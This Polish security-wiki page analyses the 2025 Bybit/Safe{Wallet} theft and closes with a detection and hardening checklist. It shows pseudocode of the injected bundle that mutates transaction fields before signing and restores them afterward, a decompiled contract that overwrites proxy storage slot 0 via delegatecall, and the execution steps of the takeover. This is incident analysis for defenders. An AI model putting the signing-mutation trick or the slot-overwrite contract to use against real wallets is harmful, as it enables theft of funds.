# Kompromitacja workflow podpisywania Web3 i przejęcie proxy Safe Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Overview

Kradzież z cold-walleta obejmowała **supply-chain compromise interfejsu webowego Safe{Wallet}** oraz **on-chain primitive delegatecall, który nadpisał wskaźnik implementacji proxy (slot 0)**. Najważniejsze wnioski:

- Jeśli dApp może wstrzyknąć kod do ścieżki podpisywania, może skłonić signera do wygenerowania poprawnego **podpisu EIP-712 dla pól wybranych przez atakującego**, jednocześnie przywracając oryginalne dane UI, aby pozostali signerzy nie zdawali sobie z tego sprawy.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Proxy Safe przechowują `masterCopy` (implementację) w **storage slot 0**. Delegatecall do kontraktu, który zapisuje dane w slocie 0, skutecznie „upgrade’uje” Safe do logiki atakującego, zapewniając mu pełną kontrolę nad portfelem.<sup>[[3]](#references)</sup>

## Off-chain: ukierunkowana mutacja podpisywania w Safe{Wallet}

Zmodyfikowany bundle Safe (`_app-*.js`) selektywnie atakował konkretne adresy Safe i signerów. Wstrzyknięta logika wykonywała się bezpośrednio przed wywołaniem podpisywania:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Właściwości ataku
- **Context-gated**: zakodowane na stałe allowlisty dla docelowych Safe’ów/signerów zapobiegały szumowi i obniżały wykrywalność.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: pola (`to`, `data`, `operation`, gas) były nadpisywane bezpośrednio przed `signTransaction`, a następnie przywracane, przez co payloady propozycji w UI wyglądały niewinnie, podczas gdy podpisy odpowiadały payloadowi atakującego.<sup>[[3]](#references)</sup>
- **EIP-712 opacity**: portfele wyświetlały dane strukturalne, ale nie dekodowały zagnieżdżonego calldata ani nie wyróżniały `operation = delegatecall`, przez co zmodyfikowana wiadomość była w praktyce blind-signed.<sup>[[3]](#references)[[4]](#references)</sup>

### Znaczenie walidacji Gateway
Propozycje Safe są przesyłane do **Safe Client Gateway**.<sup>[[5]](#references)</sup> Przed wdrożeniem zaostrzonych kontroli Gateway mógł zaakceptować propozycję, w której `safeTxHash`/podpis odpowiadały innym polom niż te w treści JSON, jeśli UI przepisał je po podpisaniu. Po incydencie Gateway odrzuca propozycje, których hash/podpis nie odpowiadają przesłanej transakcji.<sup>[[3]](#references)</sup> Podobną weryfikację hashy po stronie serwera należy wymuszać w każdym API do orkiestracji podpisywania.

### Najważniejsze informacje dotyczące incydentu Bybit/Safe z 2025 roku
- Drenaż cold-walleta Bybit z 21 lutego 2025 roku (~401 tys. ETH) wykorzystywał ten sam schemat: przejęty bundle Safe S3 uruchamiał się wyłącznie dla signerów Bybit i zamieniał `operation=0` → `1`, wskazując `to` na wcześniej wdrożony kontrakt atakującego, który zapisywał slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Zbuforowany przez Wayback `_app-52c9031bfa03da47.js` pokazuje, że logika była powiązana z Safe Bybit (`0x1db9…cf4`) i adresami signerów, a następnie natychmiast przywracano czysty bundle dwie minuty po wykonaniu, odtwarzając trik „mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Złośliwy kontrakt (np. `0x9622…c7242`) zawierał proste funkcje `sweepETH/sweepERC20` oraz `transfer(address,uint256)`, która zapisywała implementację do slotu. Wykonanie `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` zmieniało implementację proxy i zapewniało pełną kontrolę.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: przejęcie proxy przez delegatecall wskutek kolizji slotów

Proxy Safe przechowują `masterCopy` w **storage slot 0** i delegują do niego całą logikę. Ponieważ Safe obsługuje **`operation = 1` (delegatecall)**, każda podpisana transakcja może wskazywać dowolny kontrakt i wykonywać jego kod w kontekście storage proxy.<sup>[[3]](#references)</sup>

Kontrakt atakującego naśladował `transfer(address,uint256)` ERC-20, ale zamiast tego zapisywał `_to` do slotu 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Ścieżka wykonania:<sup>[[1]](#references)[[3]](#references)</sup>
1. Ofiary podpisują `execTransaction` z `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy weryfikuje podpisy dla tych parametrów.
3. Proxy wykonuje delegatecall do `attackerContract`; treść `transfer` zapisuje slot 0.
4. Slot 0 (`masterCopy`) wskazuje teraz na logikę kontrolowaną przez atakującego → **pełne przejęcie portfela i opróżnienie środków**.

### Uwagi dotyczące Guard i wersji (hardening po incydencie)
- Guardy transakcji wprowadzono w Safe v1.3.0; mogą sprawdzać wszystkie parametry `execTransaction` przed wykonaniem. Guard może odrzucać `delegatecall` lub wymuszać zasady dotyczące celu i calldata. Bybit używał wersji v1.1.1, która nie zawierała jeszcze tego hooka.<sup>[[2]](#references)[[6]](#references)</sup>

## Lista kontrolna wykrywania i hardeningu

- **Integralność UI**: przypinaj zasoby JS / SRI; monitoruj różnice między bundle'ami; traktuj UI podpisywania jako część granicy zaufania.
- **Walidacja w momencie podpisywania**: hardware wallets z **EIP-712 clear-signing**; jawnie wyświetlaj `operation` i dekoduj zagnieżdżone calldata. Odrzucaj podpisywanie, gdy `operation = 1`, chyba że zezwala na to polityka.<sup>[[3]](#references)</sup>
- **Sprawdzanie hashy po stronie serwera**: gatewaye/usługi przekazujące propozycje muszą ponownie obliczać `safeTxHash` i weryfikować, czy podpisy odpowiadają przesłanym polom.<sup>[[3]](#references)</sup>
- **Polityki/allowlisty**: reguły preflight dla `to`, selectorów i typów aktywów oraz blokowanie delegatecall z wyjątkiem zweryfikowanych przepływów. Przed rozgłaszaniem w pełni podpisanych transakcji wymagaj wewnętrznego serwisu polityk.
- **Projekt kontraktu**: unikaj udostępniania arbitralnego delegatecall w portfelach multisig/treasury, chyba że jest to bezwzględnie konieczne. Traktuj każdy wskaźnik implementacji jako prymityw upgrade'u: chroń go za pomocą jawnej kontroli dostępu oraz guarduj cele/selektory delegatecall; samo przeniesienie wskaźnika do innego slota nie stanowi kompletnej obrony.<sup>[[3]](#references)[[6]](#references)</sup>
- **Monitorowanie**: generuj alerty dotyczące wykonań delegatecall z portfeli przechowujących środki treasury oraz propozycji, które zmieniają `operation` z typowych wzorców `call`.

## References

- [1] [Analiza śledcza exploita Bybit Safe przeprowadzona przez AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Analiza kompromitacji bundla Safe przeprowadzona przez Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Szczegółowa analiza techniczna hacku Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Dziennik zmian Safe smart account v1.3.0 (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
